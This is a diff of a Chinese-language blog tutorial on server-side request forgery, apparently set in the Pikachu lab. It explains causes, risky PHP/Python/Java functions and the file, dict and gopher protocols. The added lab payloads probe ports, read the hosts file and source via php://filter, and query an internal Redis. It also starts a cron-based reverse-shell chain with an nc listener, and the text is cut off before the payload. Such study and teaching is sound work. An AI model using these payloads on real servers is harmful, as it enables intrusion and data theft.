@@ -20,29 +20,38 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF1.1 什么是SSRFSSRF(Server-Side Request Forgery, 服务端请求伪造): 服务器在没有对目标地址做有效过滤的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机” 1.2 根因用户可控的 URL &#x2F; 资源标识符">
+    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF (服务端请求伪造)1.1 基础 客户端请求: 由客户端设备(个人计算机, 手机, 平板电脑) 或软件 (浏览器, 各种APP) 发出的请求, 以获取指定的网页, 图片, 视频或其他资源, 例: 用户在浏览器输入URL或点击链接时, 浏览器会自动发起HTTP请求, 请求服务器返回">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSRF">
 <meta property="og:url" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/index.html">
 <meta property="og:site_name" content="Byron">
-<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF1.1 什么是SSRFSSRF(Server-Side Request Forgery, 服务端请求伪造): 服务器在没有对目标地址做有效过滤的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机” 1.2 根因用户可控的 URL &#x2F; 资源标识符">
+<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: Pikachu  1.0 SSRF (服务端请求伪造)1.1 基础 客户端请求: 由客户端设备(个人计算机, 手机, 平板电脑) 或软件 (浏览器, 各种APP) 发出的请求, 以获取指定的网页, 图片, 视频或其他资源, 例: 用户在浏览器输入URL或点击链接时, 浏览器会自动发起HTTP请求, 请求服务器返回">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf1.png">
 <meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png">
 <meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/2.png">
 <meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/3.png">
 <meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/4.png">
 <meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/5.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/6.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/7.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/8.png">
+<meta property="og:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/9.png">
 <meta property="article:published_time" content="2026-08-07T14:00:00.000Z">
-<meta property="article:modified_time" content="2026-08-09T12:02:39.199Z">
+<meta property="article:modified_time" content="2026-09-02T07:48:30.353Z">
 <meta property="article:author" content="Byron">
 <meta property="article:tag" content="curl">
-<meta property="article:tag" content="dict">
-<meta property="article:tag" content="file">
-<meta property="article:tag" content="gopher">
+<meta property="article:tag" content="dict:&#x2F;&#x2F;">
+<meta property="article:tag" content="file:&#x2F;&#x2F;">
+<meta property="article:tag" content="gopher:&#x2F;&#x2F;">
 <meta property="article:tag" content="pikachu">
+<meta property="article:tag" content="ssh">
 <meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="反弹shell">
+<meta property="article:tag" content="定时任务">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/1.png">
+<meta name="twitter:image" content="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf.png">
 
 
 <link rel="canonical" href="https://byroins.github.io/2026/08/07/web-security/ssrf/2026-08-07-ssrf/">
@@ -175,7 +184,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-0-SSRF"><span class="nav-number">1.</span> <span class="nav-text">1.0 SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AFSSRF"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 什么是SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%A0%B9%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 根因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 常见危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%88%86%E7%B1%BB"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 漏洞危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.6.</span> <span class="nav-text">2.0 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-0-1-php%E5%87%BD%E6%95%B0"><span class="nav-number">1.6.1.</span> <span class="nav-text">2.0.1 php函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-0-2-CURL%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.0.2  CURL协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Pass-01-%E6%9C%AC%E5%9C%B0%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95"><span class="nav-number">1.6.3.</span> <span class="nav-text">2.1 Pass-01-本地编写测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.6.4.</span> <span class="nav-text">2.2 Pikachu靶场实验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-0-%E9%98%B2%E5%BE%A1"><span class="nav-number">1.7.</span> <span class="nav-text">3.0 防御</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-SSRF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="nav-number">1.</span> <span class="nav-text">1.0 SSRF (服务端请求伪造)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%BB%80%E4%B9%88%E6%98%AFSSRF"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 什么是SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 漏洞危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 漏洞场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-%E5%B8%B8%E8%A7%81%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 常见危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-7-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="nav-number">1.7.</span> <span class="nav-text">1.7 漏洞分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.8.</span> <span class="nav-text">2.0 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-Pass-01-%E6%9C%AC%E5%9C%B0%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95"><span class="nav-number">1.8.1.</span> <span class="nav-text">2.1 Pass-01-本地编写测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C"><span class="nav-number">1.8.2.</span> <span class="nav-text">2.2 靶场实验</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-%E4%BA%91%E5%B9%B3%E5%8F%B0-SSRF-%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.8.3.</span> <span class="nav-text">2.3 云平台 SSRF 漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%9B%E9%98%B6"><span class="nav-number">1.9.</span> <span class="nav-text">3.0 漏洞利用进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB"><span class="nav-number">1.9.1.</span> <span class="nav-text">3.1 内网应用攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#01-%E9%80%9A%E8%BF%87dict-%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">01 通过dict:&#x2F;&#x2F; 协议攻击内网Redis</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#02-%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.9.1.2.</span> <span class="nav-text">02 写定时任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#03-SSH%E5%85%AC%E9%92%A5%E5%86%99%E5%85%A5"><span class="nav-number">1.9.1.3.</span> <span class="nav-text">03 SSH公钥写入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#04-gopher%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8"><span class="nav-number">1.9.1.4.</span> <span class="nav-text">04 gopher协议攻击内网应用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-0-%E7%BB%95%E8%BF%87"><span class="nav-number">1.10.</span> <span class="nav-text">4.0 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-0-%E9%98%B2%E5%BE%A1"><span class="nav-number">1.11.</span> <span class="nav-text">5.0 防御</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -190,18 +199,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">74</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -272,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-08-09 20:02:39" itemprop="dateModified" datetime="2026-08-09T20:02:39+08:00">2026-08-09</time>
+      <time title="Modified: 2026-09-02 15:48:30" itemprop="dateModified" datetime="2026-09-02T15:48:30+08:00">2026-09-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -307,33 +316,43 @@
     <div class="post-body" itemprop="articleBody"><blockquote>
 <p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: Pikachu</p>
 </blockquote>
-<h1 id="1-0-SSRF"><a href="#1-0-SSRF" class="headerlink" title="1.0 SSRF"></a>1.0 SSRF</h1><h3 id="1-1-什么是SSRF"><a href="#1-1-什么是SSRF" class="headerlink" title="1.1 什么是SSRF"></a>1.1 什么是SSRF</h3><p><strong>SSRF</strong>(Server-Side Request Forgery, 服务端请求伪造): 服务器在<strong>没有对目标地址做有效过滤</strong>的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机”</p>
-<h3 id="1-2-根因"><a href="#1-2-根因" class="headerlink" title="1.2 根因"></a>1.2 根因</h3><p><strong>用户可控的 URL &#x2F; 资源标识符 → 进入了网络请求函数, 且无过滤</strong> 和文件包含 <code>include($_GET[&#39;file&#39;])</code> 是同一类</p>
-<h3 id="1-3-常见危险函数"><a href="#1-3-常见危险函数" class="headerlink" title="1.3 常见危险函数"></a>1.3 常见危险函数</h3><table>
-<thead>
-<tr>
-<th>语言</th>
-<th>危险函数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>PHP</td>
-<td><code>curl</code>、<code>file_get_contents</code>、<code>fsockopen</code>、<code>fopen</code></td>
-</tr>
-<tr>
-<td>Python</td>
-<td><code>requests</code>、<code>urllib</code></td>
-</tr>
-<tr>
-<td>Java</td>
-<td><code>URL.openConnection</code>、<code>HttpClient</code></td>
-</tr>
-</tbody></table>
-<h3 id="1-4-分类"><a href="#1-4-分类" class="headerlink" title="1.4 分类"></a>1.4 分类</h3><ul>
-<li>有回显SSRF: 内网响应直接返回给攻击者</li>
-<li>无回显SSRF(Blind): 无回显, 需要 DNSLog &#x2F; 时间差等侧信道确认和利用</li>
+<h2 id="1-0-SSRF-服务端请求伪造"><a href="#1-0-SSRF-服务端请求伪造" class="headerlink" title="1.0 SSRF (服务端请求伪造)"></a>1.0 SSRF (服务端请求伪造)</h2><h3 id="1-1-基础"><a href="#1-1-基础" class="headerlink" title="1.1 基础"></a>1.1 基础</h3><ul>
+<li><p>客户端请求:</p>
+<p>由客户端设备(个人计算机, 手机, 平板电脑) 或软件 (浏览器, 各种APP) 发出的请求, 以获取指定的网页, 图片, 视频或其他资源, 例: 用户在浏览器输入URL或点击链接时, 浏览器会自动发起HTTP请求, 请求服务器返回指定资源.</p>
+</li>
+<li><p>服务端请求</p>
+<p>服务器应用程序或服务会提供功能接口, 比如API接口, 用于与其他服务进行数据交互, 这些由服务器之间的请求称之为服务端请求.</p>
+</li>
 </ul>
-<h3 id="1-5-漏洞危害"><a href="#1-5-漏洞危害" class="headerlink" title="1.5 漏洞危害"></a>1.5 漏洞危害</h3><table>
+<h3 id="1-2-什么是SSRF"><a href="#1-2-什么是SSRF" class="headerlink" title="1.2 什么是SSRF"></a>1.2 什么是SSRF</h3><p><strong>SSRF</strong>(Server-Side Request Forgery, 服务端请求伪造): 服务器在<strong>没有对目标地址做有效过滤</strong>的情况下, 替攻击者向任意地址发起请求, 攻击者相当于把服务器当成了”跳板机”, 攻击者使用受害者服务器应用程序作为代理, 让请求拥有服务器特征.</p>
+<p><strong>SSRF 漏洞核心标准:</strong></p>
+<ul>
+<li><p>请求是否由服务器发起</p>
+</li>
+<li><p>如何判断请求是否由服务器发起?</p>
+<ul>
+<li>有回显: 是否可以探测到内部服务?</li>
+<li>无回显: 由访问IP判断</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>以下 SSRF 攻击链逻辑图解</p>
+</blockquote>
+<hr>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf.png"></p>
+<hr>
+<h3 id="1-3-漏洞成因"><a href="#1-3-漏洞成因" class="headerlink" title="1.3 漏洞成因"></a>1.3 漏洞成因</h3><p>由于服务端提供从其他服务器应用获取数据的功能, 但又未对目标地址做严格过滤与限制, 导致攻击者可以传入任意地址让后端服务器对其发起请求, 并返回请求数据, 例: 从指定URL获取网页文本内容, 加载指定地址的图片, 下载等…</p>
+<hr>
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/ssrf1.png"></p>
+<hr>
+<h3 id="1-4-漏洞危害"><a href="#1-4-漏洞危害" class="headerlink" title="1.4 漏洞危害"></a>1.4 漏洞危害</h3><ul>
+<li>窃取数据: 攻击者可伪造请求以访问服务器内部网络或云环境中的其他服务或资源</li>
+<li>攻击第三方系统: 攻击者可伪造请求攻击第三方系统, 例: 访问其他组织敏感数据或执行拒绝服务攻击</li>
+<li>内部端口扫描: 攻击者可伪造请求扫描服务器内部端口和服务</li>
+<li>获取指纹: 通过获取 web 应用收集指纹信息</li>
+</ul>
+<table>
 <thead>
 <tr>
 <th>危害</th>
@@ -366,7 +385,35 @@
 <p>协议就是 SSRF 的武器库: <code>file</code> 读文件、<code>dict</code> 探服务、<code>gopher</code> 发任意 TCP 字节流(万能)</p>
 </blockquote>
 <hr>
-<h2 id="2-0-漏洞利用"><a href="#2-0-漏洞利用" class="headerlink" title="2.0 漏洞利用"></a>2.0 漏洞利用</h2><h3 id="2-0-1-php函数"><a href="#2-0-1-php函数" class="headerlink" title="2.0.1 php函数"></a>2.0.1 php函数</h3><table>
+<h3 id="1-5-漏洞场景"><a href="#1-5-漏洞场景" class="headerlink" title="1.5 漏洞场景"></a>1.5 漏洞场景</h3><p>SSRF 漏洞一般存在于 Web 应用程序中, 应用程序接收来自用户的输入, 将请求转发至其他服务器, 攻击者在输入中注入恶意URL, 使服务器发起未授权请求, 访问敏感内部资源.</p>
+<ul>
+<li>文件上传功能</li>
+<li>图片处理功能</li>
+<li>URL重定向</li>
+<li>API调用</li>
+</ul>
+<hr>
+<h3 id="1-6-常见危险函数"><a href="#1-6-常见危险函数" class="headerlink" title="1.6 常见危险函数"></a>1.6 常见危险函数</h3><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>危险函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td><code>curl()</code>、<code>file_get_contents()</code>、<code>fsockopen()</code>、<code>fopen()</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>requests()</code>、<code>urllib()</code></td>
+</tr>
+<tr>
+<td>Java</td>
+<td><code>URL.openConnection()</code>、<code>HttpClient()</code></td>
+</tr>
+</tbody></table>
+<table>
 <thead>
 <tr>
 <th>函数</th>
@@ -386,7 +433,7 @@
 <td>打开一个网络连接或者一个Unix套接字连接</td>
 </tr>
 </tbody></table>
-<h3 id="2-0-2-CURL协议"><a href="#2-0-2-CURL协议" class="headerlink" title="2.0.2  CURL协议"></a>2.0.2  CURL协议</h3><table>
+<table>
 <thead>
 <tr>
 <th>协议</th>
@@ -394,20 +441,25 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>file</td>
+<td>file:&#x2F;&#x2F;</td>
 <td>查看文件</td>
 </tr>
 <tr>
-<td>dict</td>
+<td>dict:&#x2F;&#x2F;</td>
 <td>探测端口</td>
 </tr>
 <tr>
-<td>gopher</td>
+<td>gopher:&#x2F;&#x2F;</td>
 <td>发送任意 TCP 原始字节流<br>可打 Redis&#x2F;MySQL&#x2F;FastCGI 写 webshell, 进而 RCE</td>
 </tr>
 </tbody></table>
 <hr>
-<h3 id="2-1-Pass-01-本地编写测试"><a href="#2-1-Pass-01-本地编写测试" class="headerlink" title="2.1 Pass-01-本地编写测试"></a>2.1 Pass-01-本地编写测试</h3><p><code>ssrf1.php</code></p>
+<h3 id="1-7-漏洞分类"><a href="#1-7-漏洞分类" class="headerlink" title="1.7 漏洞分类"></a>1.7 漏洞分类</h3><ul>
+<li>有回显SSRF: 内网响应直接返回给攻击者</li>
+<li>无回显SSRF(Blind): 无回显, 需要 DNSLog &#x2F; 时间差等侧信道确认和利用</li>
+</ul>
+<hr>
+<h3 id="2-0-漏洞利用"><a href="#2-0-漏洞利用" class="headerlink" title="2.0 漏洞利用"></a>2.0 漏洞利用</h3><h4 id="2-1-Pass-01-本地编写测试"><a href="#2-1-Pass-01-本地编写测试" class="headerlink" title="2.1 Pass-01-本地编写测试"></a>2.1 Pass-01-本地编写测试</h4><p><code>ssrf1.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="comment">// 设置URL及选项</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="comment">// 关闭cURL资源, 并释放系统资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -432,7 +484,8 @@
 </blockquote>
 </li>
 </ul>
-<h3 id="2-2-Pikachu靶场实验"><a href="#2-2-Pikachu靶场实验" class="headerlink" title="2.2 Pikachu靶场实验"></a>2.2 Pikachu靶场实验</h3><ul>
+<hr>
+<h4 id="2-2-靶场实验"><a href="#2-2-靶场实验" class="headerlink" title="2.2 靶场实验"></a>2.2 靶场实验</h4><ul>
 <li><p>端口探测(curl)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict:<span class="comment">//127.0.0.1:3306</span></span><br></pre></td></tr></table></figure>
 
@@ -442,12 +495,12 @@
 </blockquote>
 </li>
 <li><p>读取本机hosts文件(curl)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:<span class="comment">///c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/4.png"></p>
 </li>
 <li><p>文件读取(file_get_contents)</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:<span class="comment">//c:windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file:<span class="comment">//c:/windows/system32/drivers/etc/hosts</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>通过php伪协议读取源码(file_get_contents)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=ssrf.php</span></span><br></pre></td></tr></table></figure>
@@ -459,7 +512,162 @@
 </li>
 </ul>
 <hr>
-<h2 id="3-0-防御"><a href="#3-0-防御" class="headerlink" title="3.0 防御"></a>3.0 防御</h2><table>
+<h4 id="2-3-云平台-SSRF-漏洞"><a href="#2-3-云平台-SSRF-漏洞" class="headerlink" title="2.3 云平台 SSRF 漏洞"></a>2.3 云平台 SSRF 漏洞</h4><ul>
+<li><p>云平台服务器从物理层隔绝内网服务, 如何打出危害?</p>
+<p>通过<code>云元数据</code> <code>[meta data]</code>打出危害.</p>
+<p>01 各云服务商均拥有服务器<code>云元数据地址</code></p>
+<p>02 通过地址获取元数据密钥等敏感信息</p>
+</li>
+</ul>
+<hr>
+<h3 id="3-0-漏洞利用进阶"><a href="#3-0-漏洞利用进阶" class="headerlink" title="3.0 漏洞利用进阶"></a>3.0 漏洞利用进阶</h3><h4 id="3-1-内网应用攻击"><a href="#3-1-内网应用攻击" class="headerlink" title="3.1 内网应用攻击"></a>3.1 内网应用攻击</h4><h5 id="01-通过dict-协议攻击内网Redis"><a href="#01-通过dict-协议攻击内网Redis" class="headerlink" title="01 通过dict:// 协议攻击内网Redis"></a>01 通过<code>dict://</code> 协议攻击内网<code>Redis</code></h5><ul>
+<li>Redis端口若未开启认证, 可导致任意用户利用ssrf漏洞攻击内网未授权Redis, 读取Redis数据</li>
+<li>若运行Redis的用户是root, 攻击者可写定时任务进行<code>反弹shell</code></li>
+</ul>
+<p>探测内网服务:</p>
+<ul>
+<li><p>Ubuntu作为受害者服务器, 使用包含 SSRF 漏洞的靶场进行<code>dict://</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://10.0.0.10:6379/info</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/6.png"></p>
+</li>
+</ul>
+<hr>
+<h5 id="02-写定时任务"><a href="#02-写定时任务" class="headerlink" title="02 写定时任务"></a>02 写定时任务</h5><ol>
+<li><p>定时任务通过<code>crond</code>完成, 是linux的定时执行工具, 不同系统定时任务目录如下:</p>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>目录</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CentOS</td>
+<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>可根据服务器存在的文件判断服务器信息</p>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CentOS</td>
+<td>&#x2F;etc&#x2F;os-release</td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td>&#x2F;etc&#x2F;lsb-release</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>使用攻击主机监听一个端口, 用来接收受害主机执行定时任务的反弹shell</p>
+<ul>
+<li>攻击机和目标机必须在同一环境:<ul>
+<li>本地靶场 → 本地kali攻击机</li>
+<li>公网服务器目标 → 公网服务器攻击机</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/08/07/web-security/ssrf/2026-08-07-ssrf/7.png"></p>
+<blockquote>
+<p>开启监听…</p>
+</blockquote>
+</li>
+<li><p>在存在漏洞的网站依次执行如下指令:</p>
